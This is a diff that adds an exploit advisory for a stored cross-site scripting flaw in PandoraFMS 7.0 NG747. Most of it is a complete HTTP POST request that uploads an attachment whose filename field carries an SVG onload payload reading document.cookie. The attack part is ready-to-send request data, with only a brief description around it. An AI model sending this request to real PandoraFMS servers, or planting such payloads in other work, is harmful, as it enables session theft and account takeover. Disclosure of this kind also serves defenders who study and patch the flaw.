@@ -1,0 +1,54 @@
+# Exploit Title: PandoraFMS NG747 7.0 - 'filename' Persistent Cross-Site Scripting
+# Date: 2020-08-20
+# Exploit Author: Emre ÖVÜNÇ
+# Vendor Homepage: https://pandorafms.org/
+# Software Link: https://pandorafms.org/features/free-download-monitoring-software/
+# Version: 7.0NG747
+# Tested on: Windows/Linux/ISO
+
+# Link https://github.com/EmreOvunc/Pandora-FMS-7.0-NG-747-Stored-XSS
+
+# Description
+A stored cross-site scripting (XSS) in Pandora FMS 7.0 NG 747 can result in
+an attacker performing malicious actions to users who open a maliciously
+crafted link or third-party web page. (Workspace >> Issues >> List of
+issues >> Add - Attachment)
+
+# PoC
+
+To exploit vulnerability, someone could use a POST request to
+'/pandora_console/index.php' by manipulating 'filename' parameter in the
+request body to impact users who open a maliciously crafted link or
+third-party web page.
+
+POST /pandora_console/index.php?sec=workspace&sec2=operation/incidents/incident_detail&id=3&upload_file=1
+HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0)
+Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data;
+boundary=---------------------------188134206132629608391758747427
+Content-Length: 524
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=3098fl65su4l237navvq6d5igs
+Upgrade-Insecure-Requests: 1
+
+-----------------------------188134206132629608391758747427
+Content-Disposition: form-data; name="userfile"; filename="\"><svg
+onload=alert(document.cookie)>.png"
+Content-Type: image/png
+
+"><svg onload=alert(1)>
+-----------------------------188134206132629608391758747427
+Content-Disposition: form-data; name="file_description"
+
+desc
+-----------------------------188134206132629608391758747427
+Content-Disposition: form-data; name="upload"
+
+Upload
+-----------------------------188134206132629608391758747427--
